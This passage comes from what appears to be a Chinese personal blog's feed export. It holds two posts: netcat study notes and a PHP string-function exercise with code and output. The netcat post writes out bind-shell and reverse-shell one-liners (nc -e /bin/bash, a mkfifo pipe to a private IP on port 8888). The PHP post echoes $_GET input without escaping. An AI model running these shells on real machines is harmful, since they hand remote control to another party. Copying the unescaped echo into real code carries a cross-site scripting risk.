<h3 id="利用nc进行端口扫描"><a href="#利用nc进行端口扫描" class="headerlink" title="利用nc进行端口扫描:"></a>利用nc进行端口扫描:</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -vz ip prot</span><br></pre></td></tr></table></figure>

<p>#v 显示 多点信息<br>#z 不发送数据<br>#r 随机指定端口与远程主机通信<br>#w3 设置超时3s(等待连线时间)<br>#多端口扫描使用 1-65535 </p>
<p>不同版本的其他用法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -w 3 ip port &lt; /dev/null &amp;&amp; echo &quot;ok&quot;</span><br></pre></td></tr></table></figure>



<h3 id="利用nc弹shell"><a href="#利用nc弹shell" class="headerlink" title="利用nc弹shell"></a>利用nc弹shell</h3><p>被控制机:<code>nc -lp 80 -e /bin/bash</code><br>控制机:<code>nc &lt;被控制机ip&gt; &lt;被控制机port&gt;</code><br>#l 持续监听<br>#p 制定本机通信端口<br>#e 连接建立的时候执行一个程序</p>
<p><img src="https://i.loli.net/2020/10/14/5BjJQkHgbFwv2hq.png" alt="image.png"></p>
<p>其他版本的使用方式(利用管道符):</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/f</span><br><span class="line">cat /tmp/f  | /bin/bash 2&gt;&amp;1 | nc -l -p 80 &gt; /tmp/f</span><br></pre></td></tr></table></figure>

<p>#mkfifo 制作FIFO专用文件（命名管道）<br>#cat 喵</p>
<p><strong>反弹shell</strong>:<br>看懂了 上面反弹shell就和弹shell基本上都是异曲同工<br>被控制端的几种使用方法:<br>1: <code>cat /tmp/www | /bin/bash 2&gt;&amp;1 | nc 192.168.1.174 8888 &gt; /tmp/www</code><br>2: <code>nc 192.168.1.174 8888</code><br>控制段的使用方法:<br><code>nc -lvvp 8888</code></p>
<p>其他:</p>
<p>关于文件传输下次再补上吧</p>
<p>参考资料:<br><a href="https://zhuanlan.zhihu.com/p/83959309">https://zhuanlan.zhihu.com/p/83959309</a><br><a href="https://linux.die.net/man/3/mkfifo">https://linux.die.net/man/3/mkfifo</a><br><a href="https://linux.die.net/man/7/fifo">https://linux.die.net/man/7/fifo</a><br><a href="https://www.jianshu.com/p/5b73a607e2ea">https://www.jianshu.com/p/5b73a607e2ea</a></p>
]]></content>
      <categories>
        <category>安全</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20201016-PHP基础练习</title>
    <url>/2020/10/17/20201016-PHP%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="20201016-PHP基础练习"><a href="#20201016-PHP基础练习" class="headerlink" title="20201016-PHP基础练习"></a>20201016-PHP基础练习</h1><ul>
<li><strong><em>函数列出以及用法(包括官方文档资料以及一些个人理解(:)</em></strong>:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">strlen([<span class="keyword">string</span>]);</span><br><span class="line"><span class="comment">#检查字符串的长度</span></span><br><span class="line"></span><br><span class="line">mb_strlen([<span class="keyword">string</span>],[$encoding]);</span><br><span class="line"><span class="comment">#检查字符串长度运行自定义字符编码,encoding为可选参数</span></span><br><span class="line"></span><br><span class="line">addslashes([<span class="keyword">string</span>]);</span><br><span class="line"><span class="comment">#使用反斜线引用字符串</span></span><br><span class="line"></span><br><span class="line">bin2hex([<span class="keyword">string</span>]);</span><br><span class="line"><span class="comment">#将字符串转换为16进制</span></span><br><span class="line"></span><br><span class="line">chop([<span class="keyword">string</span>],[$charlist]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">rtrim的别名 删除字符串末端的空白字符(或者其他字符)</span></span><br><span class="line"><span class="comment">charlist可选参,缺省默认删除末端空白支付,charlist=要指定删除的字符</span></span><br><span class="line"><span class="comment">空白字符:</span></span><br><span class="line"><span class="comment">&quot; &quot; (ASCII 32 (0x20))，普通空白符。</span></span><br><span class="line"><span class="comment">&quot;\t&quot; (ASCII 9 (0x09))，制表符。</span></span><br><span class="line"><span class="comment">&quot;\n&quot; (ASCII 10 (0x0A))，换行符。</span></span><br><span class="line"><span class="comment">&quot;\r&quot; (ASCII 13 (0x0D))，回车符。</span></span><br><span class="line"><span class="comment">&quot;\0&quot; (ASCII 0 (0x00))，NUL 空字节符。</span></span><br><span class="line"><span class="comment">&quot;\x0B&quot; (ASCII 11 (0x0B))，垂直制表符。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">chr([ascii]);</span><br><span class="line"><span class="comment">#返回指定的ascii字符</span></span><br><span class="line"></span><br><span class="line">crypt([<span class="keyword">string</span>],[$salt]);</span><br><span class="line"><span class="comment">#单向字符串散列 返回一个基于UNIX DES算法或系统上其他可用的替代算法的散列字符串。</span></span><br><span class="line"><span class="comment">#salt可选参数(应该是盐)官方建议为了更好的安全性，请确保指定一个足够强度的盐值。</span></span><br><span class="line"></span><br><span class="line">htmlentities([<span class="keyword">string</span>],[$flags],[$character_set],[$double_encode]);</span><br><span class="line"><span class="comment">#将字符转换为html转义字符</span></span><br><span class="line"><span class="comment">#flags可选参数(掩码标记官方提供方法)默认为ENT_COMPAT|ENT_HTML401</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ENT_COMPAT    会转换双引号，不转换单引号。</span></span><br><span class="line"><span class="comment">ENT_QUOTES    既转换双引号也转换单引号。</span></span><br><span class="line"><span class="comment">ENT_NOQUOTES    单/双引号都不转换</span></span><br><span class="line"><span class="comment">ENT_IGNORE    静默丢弃无效的代码单元序列，而不是返回空字符串。 不建议使用此标记， 因为它» 可能有安全影响。</span></span><br><span class="line"><span class="comment">ENT_SUBSTITUTE    替换无效的代码单元序列为 Unicode 代替符（Replacement Character）， U+FFFD (UTF-8) 或者 &amp;#xFFFD; (其他)，而不是返回空字符串。</span></span><br><span class="line"><span class="comment">ENT_DISALLOWED    为文档的无效代码点替换为 Unicode 代替符（Replacement Character）： U+FFFD (UTF-8)，或 &amp;#xFFFD;（其他），而不是把它们留在原处。 比如以下情况下就很有用：要保证 XML 文档嵌入额外内容时格式合法。</span></span><br><span class="line"><span class="comment">ENT_HTML401    以 HTML 4.01 处理代码。</span></span><br><span class="line"><span class="comment">ENT_XML1    以 XML 1 处理代码。</span></span><br><span class="line"><span class="comment">ENT_XHTML    以 XHTML 处理代码。</span></span><br><span class="line"><span class="comment">ENT_HTML5    以 HTML 5 处理代码。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">#double_encode 可选参数编码字符的方式</span></span><br><span class="line"></span><br><span class="line">implode([$glue stringr],[$pieces <span class="keyword">array</span>]);</span><br><span class="line"><span class="comment">#将一个一维数组转换为字符串</span></span><br><span class="line"><span class="comment">#$glue默认为空,将一维数组的值链接为一个字符串</span></span><br><span class="line"><span class="comment">#你想要转换的数组</span></span><br><span class="line"></span><br><span class="line">md5_file([<span class="keyword">string</span>],[<span class="keyword">bool</span>]);</span><br><span class="line"><span class="comment">#参数一 File 文件名(必要) ,参数二raw_output 布尔类型 如果被设置为 TRUE，那么报文摘要将以原始的 16 位二进制格式返回。(可选)</span></span><br><span class="line"><span class="comment">#返回文件的md5</span></span><br><span class="line"></span><br><span class="line">str_replace();</span><br><span class="line"><span class="comment">#官方:&quot;子字符串替换&quot; (迷惑)</span></span><br><span class="line"><span class="comment">#个人理解 对字符串进行替换 参数可为数组类型</span></span><br><span class="line"><span class="comment">#来自官方文档:https://www.php.net/manual/zh/function.str-replace.php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</span></span><br><span class="line"><span class="comment">该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。</span></span><br><span class="line"><span class="comment">参数:</span></span><br><span class="line"><span class="comment">如果没有一些特殊的替换需求（比如正则表达式），你应该使用该函数替换 ereg_replace() 和 preg_replace()。</span></span><br><span class="line"><span class="comment">如果 search 和 replace 为数组，那么 str_replace() 将对 subject 做二者的映射替换。如果 replace 的值的个数少于 search 的个数，多余的替换将使用空字符串来进行。如果 search 是一个数组而 replace 是一个字符串，那么 search 中每个元素的替换将始终使用这个字符串。该转换不会改变大小写。</span></span><br><span class="line"><span class="comment">如果 search 和 replace 都是数组，它们的值将会被依次处理。</span></span><br><span class="line"><span class="comment">search</span></span><br><span class="line"><span class="comment">查找的目标值，也就是 needle。一个数组可以指定多个目标。</span></span><br><span class="line"><span class="comment">replace</span></span><br><span class="line"><span class="comment">search 的替换值。一个数组可以被用来指定多重替换。</span></span><br><span class="line"><span class="comment">subject</span></span><br><span class="line"><span class="comment">执行替换的数组或者字符串。也就是 haystack。</span></span><br><span class="line"><span class="comment">如果 subject 是一个数组，替换操作将遍历整个 subject，返回值也将是一个数组。</span></span><br><span class="line"><span class="comment">count</span></span><br><span class="line"><span class="comment">如果被指定，它的值将被设置为替换发生的次数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">该函数返回替换后的数组或者字符串。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">str_split([<span class="keyword">string</span>],[<span class="keyword">int</span>]);</span><br><span class="line"><span class="comment">#参数一 要分割的字符串(必要) 参数二要分割的每一段的长度,缺省默认为 1 整数型</span></span><br><span class="line"></span><br><span class="line">split([<span class="keyword">string</span>],[<span class="keyword">string</span>],[<span class="keyword">int</span>]);</span><br><span class="line"><span class="comment">#用正则表达式将字符串分割到数组中</span></span><br><span class="line"><span class="comment">#参数一 正则表达式 参数二 要处理的字符串  参数三 返回的元素数量 </span></span><br><span class="line"></span><br><span class="line">strcmp([<span class="keyword">string</span>],[<span class="keyword">string</span>]);</span><br><span class="line"><span class="comment"># 字符比较(官方:二进制安全字符比较)</span></span><br><span class="line"><span class="comment"># 区分大小写</span></span><br><span class="line"><span class="comment"># 返回值 相等 返回0 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；</span></span><br><span class="line"></span><br><span class="line">strcasecmp([<span class="keyword">string</span>][<span class="keyword">string</span>]);</span><br><span class="line"><span class="comment">#和strcmp几乎一样 但是不区分大小写 是一种更安全的写法</span></span><br><span class="line"></span><br><span class="line">strstr([<span class="keyword">string</span>][mixed][<span class="keyword">bool</span>]);</span><br><span class="line"><span class="comment">#关于mixed类型</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">说明一个参数可以接受多种不同的（但不一定是所有的）类型。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">#查找字符串的首次出现,该函数区分大小写</span></span><br><span class="line"><span class="comment">#参数一 字符串(你要搜索的字符串) 参数二 (如果它不是一个字符串那么它将被转化为整型并且作为字符的序号来使用。 参数三 bool 为真返回搜索值之前的字符串,为假反之 缺省为假</span></span><br><span class="line"></span><br><span class="line">preg_match([<span class="keyword">string</span>],[<span class="keyword">string</span>],[<span class="keyword">array</span>],[init],[init]);</span><br><span class="line"><span class="comment">#执行匹配正则表达式</span></span><br><span class="line"><span class="comment">#参数：$pattern（要搜索的模式，字符串形式），$subject（输入字符串），$matches（如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推）</span></span><br><span class="line"></span><br><span class="line">preg_match_all();</span><br><span class="line"><span class="comment">#执行一个全局正则表达式匹配</span></span><br><span class="line"><span class="comment">#来自官方的preg_match_all ( string $pattern , string $subject [, array &amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] ) : int</span></span><br><span class="line"><span class="comment">#搜索subject中所有匹配pattern给定正则表达式 的匹配结果并且将它们以flag指定顺序输出到matches中.</span></span><br><span class="line"><span class="comment">#在第一个匹配找到后, 子序列继续从最后一次匹配位置搜索.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intval([mixed],[init]);</span><br><span class="line"><span class="comment">#获取变量的整数值</span></span><br><span class="line"><span class="comment">#参数一 要装换成init的数值 参数二 要使用的进制</span></span><br><span class="line"></span><br><span class="line">floatval([mixed]);</span><br><span class="line"><span class="comment">#获取变量的浮点值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strval([mixed]);</span><br><span class="line"><span class="comment">#获取变量的字符串值</span></span><br><span class="line"></span><br><span class="line">settype([mixed],[<span class="keyword">string</span>]);</span><br><span class="line"><span class="comment">#设置变量的类型</span></span><br><span class="line"><span class="comment">#参数一可为任意类型(你要转换的对象)</span></span><br><span class="line"><span class="comment">#参数二的可能值为：</span></span><br><span class="line"><span class="comment">#“boolean” </span></span><br><span class="line"><span class="comment">#“integer” </span></span><br><span class="line"><span class="comment">#“float” </span></span><br><span class="line"><span class="comment">#&quot;string&quot;</span></span><br><span class="line"><span class="comment">#&quot;array&quot;</span></span><br><span class="line"><span class="comment">#&quot;object&quot;</span></span><br><span class="line"><span class="comment">#“null”</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>代码实例</strong>:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>); <span class="comment">//错误信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>,<span class="number">1</span>); <span class="comment">//php启动错误信息</span></span><br><span class="line">error_reporting(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;strlen:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$a1 = <span class="string">&#x27;w123t56k789&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a1.<span class="string">&#x27;=&gt;&#x27;</span>.strlen($a1).<span class="string">&#x27;&lt;br&gt;==========================</span></span><br><span class="line"><span class="string">&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;mb_strlen:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$a2 = <span class="string">&#x27;我真的不想打$符号了&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a2.<span class="string">&#x27;=&gt;&#x27;</span>.mb_strlen($a2,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;addslashes:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> addslashes(<span class="string">&#x27;ww&quot;.w/\ssss&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;bin2hex:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$a3 = <span class="string">&#x27;weeeeeeemmmm&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a3.<span class="string">&#x27;=&gt;&#x27;</span>.bin2hex($a3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;chop:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$chop1 = <span class="string">&quot;wqeqweqw &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> chop($chop1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;chr:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">72</span>).chr(<span class="number">72</span>).chr(<span class="number">72</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;crypt:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> crypt(<span class="string">&#x27;asae4564&#x27;</span>,<span class="string">&#x27;wqeqws&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;htmlentities:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> htmlentities(<span class="string">&#x27;wq/ e\ q/ qwew&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;implode:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$impstr = <span class="literal">NULL</span>;</span><br><span class="line">$imparray = <span class="keyword">array</span>(<span class="string">&quot;qweqw&quot;</span>,<span class="string">&quot;wqewwq&quot;</span>,<span class="string">&quot;12w&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> implode($impstr,$imparray);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5_file:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$md5_file1 = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5_file($md5_file1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;str_replace:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$str = str_replace(<span class="string">&quot;ll&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;good golly miss molly!&quot;</span>, $count);</span><br><span class="line"><span class="keyword">echo</span> $count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;str_split:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> str_split(<span class="string">&#x27;wqe12&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;split:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$date=<span class="string">&quot;rehwrhweui/15/45/878&quot;</span>;</span><br><span class="line"><span class="keyword">list</span>($s1,$s2,$s3) = split(<span class="string">&quot;[/.-]&quot;</span>,$date);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;year:$year;month:$month;day:$day\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;strcmp:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$strcmp1 = <span class="string">&#x27;www1&#x27;</span>;</span><br><span class="line">$strcmp2 = <span class="string">&#x27;www2&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> strcmp($strcmp1,$strcmp2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;strcasecmp:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$strcasecmp1 = <span class="string">&#x27;Wwwwe&#x27;</span>;</span><br><span class="line">$strcasecmp2 = <span class="string">&#x27;wwwwe&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> strcasecmp($strcasecmp1,$strcasecmp2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;strstr:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$strstr1 = <span class="string">&#x27;weqwe132456asdx&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> strstr($strstr1,<span class="string">&#x27;13&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;preg_match:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="string">&quot;PHP is the web scripting language of choice.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;preg_match_all:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$userinfo = <span class="string">&quot;Name: &lt;b&gt;PHP&lt;/b&gt; &lt;br&gt; Title: &lt;b&gt;Programming Language&lt;/b&gt;&quot;</span>;</span><br><span class="line">preg_match_all (<span class="string">&quot;/&lt;b&gt;(.*)&lt;\/b&gt;/U&quot;</span>, $userinfo, $pat_array);</span><br><span class="line">print_r($pat_array[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;intval:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">123.12</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">55.01</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;floatval:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> floatval(<span class="string">&#x27;12.1488wsss&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;strval:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> strval(<span class="number">123</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> strval(<span class="string">&#x27;wqeqw&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;settype:&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$int1 = <span class="string">&#x27;123123&#x27;</span>;</span><br><span class="line">$str1 = <span class="number">6666</span>;</span><br><span class="line">var_dump($int1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump($str1);</span><br><span class="line">settype($int1,<span class="string">&quot;integer&quot;</span>);</span><br><span class="line">settype($str1,<span class="string">&quot;string&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump($int1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump($str1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;==========================&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>运行结果(太长了没法好好截图)</strong>:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">strlen:</span><br><span class="line">w123t56k789=&gt;11</span><br><span class="line">==========================</span><br><span class="line">mb_strlen:</span><br><span class="line">我真的不想打$符号了=&gt;10</span><br><span class="line">==========================</span><br><span class="line">addslashes:</span><br><span class="line">ww\&quot;.w/\\ssss</span><br><span class="line">==========================</span><br><span class="line">bin2hex:</span><br><span class="line">weeeeeeemmmm=&gt;77656565656565656d6d6d6d</span><br><span class="line">==========================</span><br><span class="line">chop:</span><br><span class="line">wqeqweqw</span><br><span class="line">==========================</span><br><span class="line">chr:</span><br><span class="line">HHH</span><br><span class="line">==========================</span><br><span class="line">crypt:</span><br><span class="line">wqCseATyTaLjQ</span><br><span class="line">==========================</span><br><span class="line">htmlentities:</span><br><span class="line">wq/ e\ q/ qwew</span><br><span class="line">==========================</span><br><span class="line">implode:</span><br><span class="line">qweqwwqewwq12w</span><br><span class="line">==========================</span><br><span class="line">md5_file:</span><br><span class="line">e99426acf8e05c9c40871858ae011268</span><br><span class="line">==========================</span><br><span class="line">str_replace:</span><br><span class="line">2</span><br><span class="line">==========================</span><br><span class="line">str_split:</span><br><span class="line">Array</span><br><span class="line">==========================</span><br><span class="line">split:</span><br><span class="line">year:;month:;day:</span><br><span class="line">==========================</span><br><span class="line">strcmp:</span><br><span class="line">-1</span><br><span class="line">==========================</span><br><span class="line">strcasecmp:</span><br><span class="line">0</span><br><span class="line">==========================</span><br><span class="line">strstr:</span><br><span class="line">132456asdx</span><br><span class="line">==========================</span><br><span class="line">preg_match:</span><br><span class="line">1</span><br><span class="line">==========================</span><br><span class="line">preg_match_all:</span><br><span class="line">Array ( [0] =&gt; PHP [1] =&gt; Programming Language )</span><br><span class="line">==========================</span><br><span class="line">intval:</span><br><span class="line">123</span><br><span class="line">55</span><br><span class="line">==========================</span><br><span class="line">floatval:</span><br><span class="line">12.1488</span><br><span class="line">==========================</span><br><span class="line">strval:</span><br><span class="line">123</span><br><span class="line">wqeqw</span><br><span class="line"></span><br><span class="line">==========================</span><br><span class="line">settype:</span><br><span class="line">string(6) &quot;123123&quot;</span><br><span class="line">int(6666)</span><br><span class="line">int(123123)</span><br><span class="line">string(4) &quot;6666&quot;</span><br><span class="line">==========================</span><br></pre></td></tr></table></figure>
<h2 id="php中的判断语句"><a href="#php中的判断语句" class="headerlink" title="php中的判断语句"></a>php中的判断语句</h2><p>if:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$if1 = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($if1 == <span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你输入的值等于&#x27;</span>.$if1;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你输入的值不等于10&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/10/17/7mahRSsklbE4iZw.png" alt="image.png"><br><img src="https://i.loli.net/2020/10/17/j7SswQKaL6pnV8I.png" alt="image.png"></p>
